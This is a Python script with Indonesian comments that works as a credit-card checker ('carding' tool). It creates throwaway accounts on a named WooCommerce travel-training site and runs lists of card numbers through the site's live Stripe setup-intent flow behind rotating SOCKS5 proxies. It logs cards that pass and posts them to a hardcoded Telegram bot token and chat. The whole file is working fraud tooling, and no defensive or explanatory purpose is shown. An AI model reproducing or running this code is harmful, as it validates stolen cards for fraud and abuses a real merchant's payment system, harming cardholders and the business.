import re
import random
import string
import os
import time
import requests
from bs4 import BeautifulSoup
import concurrent.futures
import threading
import random

def get_random_proxy(proxies):
    if not proxies:
        return None
    return random.choice(proxies)

# Fungsi untuk mencetak dengan warna
def print_red(text):
    print(f"\033[91m{text}\033[0m")

def print_green(text):
    print(f"\033[92m{text}\033[0m")

def print_yellow(text):
    print(f"\033[93m{text}\033[0m")

def print_cyan(text):
    print(f"\033[96m{text}\033[0m")

def print_sline():
    print_cyan("|------------------------------------------------------|")

def load_proxies():
    file_path = "proxies.txt"
    try:
        with open(file_path, "r") as file:
            proxies = [line.strip() for line in file if line.strip()]
            return proxies
    except FileNotFoundError:
        print_red("File proxies.txt tidak ditemukan. Harap pastikan file ini ada di direktori yang sama dengan script.")
        return []

# Fungsi untuk mengirim pesan ke Telegram
def send_hits_to_telegram(message):
    telegram_token = "6860182884:AAE_7NZ6g_yr_sHVfohym-GHWrKTcI9Zf4E"
    telegram_chat_id = "2026823573"
    if message.strip():
        response = requests.post(
            f"https://api.telegram.org/bot{telegram_token}/sendMessage",
            data={'chat_id': telegram_chat_id, 'text': message}
        )
        if response.status_code != 200:
            print("Gagal mengirim pesan ke Telegram:", response.text)
    else:
        print("Pesan kosong, tidak dikirim ke Telegram.")

# Fungsi pembantu untuk menghasilkan email acak
def generate_random_email(length=8):
    return f"{''.join(random.choices(string.ascii_letters + string.digits, k=length))}@gmail.com"

# Fungsi untuk membuat session baru
def create_session():
    try:
        session = requests.Session()
        email = generate_random_email()
        headers_get = {
            'authority': 'www.thetravelinstitute.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }
        response = session.get('https://www.thetravelinstitute.com/register/', headers=headers_get, timeout=20)
        soup = BeautifulSoup(response.text, 'html.parser')
        nonce = soup.find('input', {'id': 'afurd_field_nonce'})['value']
        noncee = soup.find('input', {'id': 'woocommerce-register-nonce'})['value']
        
        headers_post = {
            'authority': 'www.thetravelinstitute.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.thetravelinstitute.com',
            'referer': 'https://www.thetravelinstitute.com/register/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }
        data = [
            ('afurd_field_nonce', nonce),
            ('_wp_http_referer', '/register/'),
            ('pre_page', ''),
            ('email', email),
            ('password', 'Esahatam2009@'),
            ('wc_order_attribution_source_type', 'typein'),
            ('wc_order_attribution_referrer', 'https://www.thetravelinstitute.com/my-account/payment-methods/'),
            ('wc_order_attribution_utm_campaign', '(none)'),
            ('wc_order_attribution_utm_source', '(direct)'),
            ('wc_order_attribution_utm_medium', '(none)'),
            ('wc_order_attribution_utm_content', '(none)'),
            ('wc_order_attribution_utm_id', '(none)'),
            ('wc_order_attribution_utm_term', '(none)'),
            ('wc_order_attribution_utm_source_platform', '(none)'),
            ('wc_order_attribution_utm_creative_format', '(none)'),
            ('wc_order_attribution_utm_marketing_tactic', '(none)'),
            ('wc_order_attribution_session_entry', 'https://www.thetravelinstitute.com/my-account/add-payment-method/'),
            ('wc_order_attribution_session_start_time', '2024-11-17 09:43:38'),
            ('wc_order_attribution_session_pages', '8'),
            ('wc_order_attribution_session_count', '1'),
            ('wc_order_attribution_user_agent', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'),
            ('woocommerce-register-nonce', noncee),
            ('_wp_http_referer', '/register/'),
            ('register', 'Register'),
        ]
        response = session.post('https://www.thetravelinstitute.com/register/', headers=headers_post, data=data, timeout=20)
        if response.status_code == 200:
            with open('Creds.txt', 'a') as f:
                f.write(email + ':' + 'Esahatam2009@')
            return session
        return None
    except Exception:
        return None

def save_session_to_file(session, file_path):
    with open(file_path, "w") as file:
        file.write(str(session.cookies.get_dict()))

def load_session_from_file(file_path):
    try:
        with open(file_path, "r") as file:
            session_data = file.read().strip()
            session = requests.Session()
            session.cookies.update(eval(session_data))
            return session
    except Exception:
        return None

def manage_session_file():
    session_file = "session.txt"
    if os.path.exists(session_file):
        session = load_session_from_file(session_file)
        if session:
            return session
    session = create_session()
    if session:
        save_session_to_file(session, session_file)
    return session

def get_credit_cards():
    file_path = "cc_list.txt"
    try:
        with open(file_path, "r") as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print_red("File cc_list.txt tidak ditemukan. Harap pastikan file ini ada di direktori yang sama dengan script.")
        return []

# Global lock untuk penulisan file secara thread-safe
file_lock = threading.Lock()

# Fungsi untuk memproses satu kartu kredit
import random
import requests
import time

def process_card(card_entry, session, file_lock, proxies, max_retries=3):
    attempt = 0
    while attempt < max_retries:
        try:
            print_sline()
            card_data = card_entry.replace('/', '|')
            parts = card_data.split("|")
            card_num, month, year, cvv = parts[0], parts[1], parts[2], parts[3]
            if "20" in year:
                year = year.split("20")[1]

            # Pilih proxy baru setiap percobaan
            proxy = get_random_proxy(proxies)
            proxies_dict = {"http": f"socks5://{proxy}", "https": f"socks5://{proxy}"} if proxy else None

            headers_get = {
                'authority': 'www.thetravelinstitute.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'referer': 'https://www.thetravelinstitute.com/my-account/payment-methods/',
                'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
            }

            response_get = session.get(
                'https://www.thetravelinstitute.com/my-account/add-payment-method/',
                headers=headers_get,
                proxies=proxies_dict,
                timeout=10  # Kurangi timeout agar cepat beralih proxy jika gagal
            )

            # Jika berhasil, lanjutkan proses normal
            if response_get.status_code == 200:
                break  # Keluar dari loop jika sukses

        except requests.exceptions.RequestException as e:
            attempt += 1
            time.sleep(1)  # Tunggu 1 detik sebelum mencoba lagi dengan proxy baru

    if attempt == max_retries:
        return ('error', card_entry)

    # ---- PROSES STRIPE DIMULAI SETELAH PROXY SUKSES ----

    try:
        nonce = re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', response_get.text).group(1)
        headers_stripe = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }
        stripe_data = f'type=card&card[number]={card_num}&card[cvc]={cvv}&card[exp_year]={year}&card[exp_month]={month}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&key=pk_live_51JDCsoADgv2TCwvpbUjPOeSLExPJKxg1uzTT9qWQjvjOYBb4TiEqnZI1Sd0Kz5WsJszMIXXcIMDwqQ2Rf5oOFQgD00YuWWyZWX'
        
        response_stripe = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=headers_stripe,
            data=stripe_data,
            timeout=10, 
            proxies=proxies_dict  # Gunakan proxy yang sudah berhasil
        )
        stripe_json = response_stripe.json()

        if 'error' in stripe_json:
            error_msg = stripe_json['error']['message']
            if 'code' in error_msg:
                print_yellow(f'> {card_data} - {error_msg}')
                with file_lock:
                    with open('CCN-HITS.txt', 'a') as hits:
                        hits.write(card_data + '\n')
                return ('ccn', card_data)
            else:
                print_red(f'> {card_data} - {error_msg}')
                return ('declined', card_data)

        payment_method_id = stripe_json.get('id')
        headers_post = {
            'authority': 'www.thetravelinstitute.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.thetravelinstitute.com',
            'referer': 'https://www.thetravelinstitute.com/my-account/add-payment-method/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        params = {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}
        post_data = {
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': nonce,
        }

        response_post = session.post(
            'https://www.thetravelinstitute.com/',
            params=params,
            headers=headers_post,
            data=post_data,
            timeout=10,
            proxies=proxies_dict  # Gunakan proxy yang sama
        )
        result = response_post.json()

        if not result.get('success', False):
            error_msg = result['data']['error']['message']
            print_red(f'> {card_data} - {error_msg}')
            return ('declined', card_data)

        with file_lock:
            with open('CCN-HITS.txt', 'a') as hits:
                hits.write(card_data + '\n')

        print_green(f'> {card_data} - Successfull!')
        send_hits_to_telegram(f"✅ Approved: {card_data} berhasil!")
        return ('hit', card_data)

    except Exception as e:
        print_red(f'|+| Error: {str(e)}')
        return ('error', card_entry)

# Fungsi pengecekan kartu kredit secara paralel
def check_credit_cards(cc_list, session, proxies):
    start_time = time.time()
    total = len(cc_list)
    hit = dec = ccn = 0

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(process_card, card_entry, session, file_lock, proxies) for card_entry in cc_list]
        for future in concurrent.futures.as_completed(futures):
            status, _ = future.result()
            if status == 'hit':
                hit += 1
            elif status == 'declined':
                dec += 1
            elif status == 'ccn':
                ccn += 1

    processing_time = time.time() - start_time
    minutes = int(processing_time // 60)
    seconds = processing_time % 60
    print_sline()
    print_green('                   SUMMARY           ')
    print_sline()
    print_green(f"""[+] Gateway: Single + Mass Stripe Auth + CCN
[~] Total: {total}
[>] Declined: {dec}
[>] Hit: {hit}
[>] CCN: {ccn}
[÷] Time: {minutes} min and {seconds:.2f} sec""")
    print_sline()

def main():
    session = manage_session_file()
    proxies = load_proxies()  # Load proxies dari file
    
    if session:
        cc_list = get_credit_cards()
        if cc_list:
            print_green(f"              Checking {len(cc_list)} credit card(s)...")
            check_credit_cards(cc_list, session, proxies)
        else:
            print_red("Tidak ada kartu kredit yang valid dalam cc_list.txt.")
    else:
        print("Unknown Error")

if __name__ == "__main__":
    main()
